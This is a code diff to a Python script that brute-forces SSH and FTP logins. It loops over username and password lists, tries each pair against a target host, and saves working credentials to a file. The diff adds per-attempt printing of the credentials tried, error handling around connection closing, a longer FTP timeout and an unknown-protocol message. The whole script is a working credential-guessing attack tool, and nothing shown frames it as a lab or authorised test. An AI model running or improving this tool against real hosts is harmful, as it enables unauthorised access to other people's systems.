@@ -11,7 +11,7 @@ def ssh_brute_force(ip, port, user, passwd):
     try:
         client.connect(hostname=ip, port=port, username=user, password=passwd, timeout=3)
     except paramiko.AuthenticationException:
-        print("Authentication failed")
+        print(f"Authentication failed - {user}:{passwd}")
     except socket.timeout:
         print("Timeout error")
     except paramiko.SSHException:
@@ -22,12 +22,16 @@ def ssh_brute_force(ip, port, user, passwd):
             f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
             f_found.flush()
     finally:
-        client.close()
+        try:
+            client.close()
+        except:
+            pass
 
 def ftp_brute_force(ip, port, user, passwd):
     server = ftplib.FTP()
+    print(f"Trying : {user}:{passwd}",flush=True)
     try:
-        server.connect(ip, port, timeout=3)
+        server.connect(ip, port, timeout=5)
         server.login(user, passwd)
 
     except ftplib.error_perm:
@@ -42,7 +46,10 @@ def ftp_brute_force(ip, port, user, passwd):
             f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
             f_found.flush()
     finally:
-        server.close()
+        try:
+            server.close()
+        except Exception as e:
+            print(f"Unexpected error: {type(e).__name__}: {e}")
 
 if __name__ == "__main__":
     arg_parser = argparse.ArgumentParser()
@@ -61,6 +68,9 @@ if __name__ == "__main__":
 
     if args.target:
         target = args.target
+    
+
+    print(f"Targetting {target} with {args.protocol}")
 
     with open(userlist, 'r') as user_list:
         for u_line in user_list:
@@ -74,10 +84,13 @@ if __name__ == "__main__":
                     elif args.protocol == "ftp":
                         ftp_brute_force(ip=target, port=21, user=username, passwd=password)
 
+                    else:
+                        print(f"Unknown protocol: '{args.protocol}'", flush=True)
 
 
 
 
+    print(f"protocol='{args.protocol}' target='{args.target}'", flush=True)
 
 
 
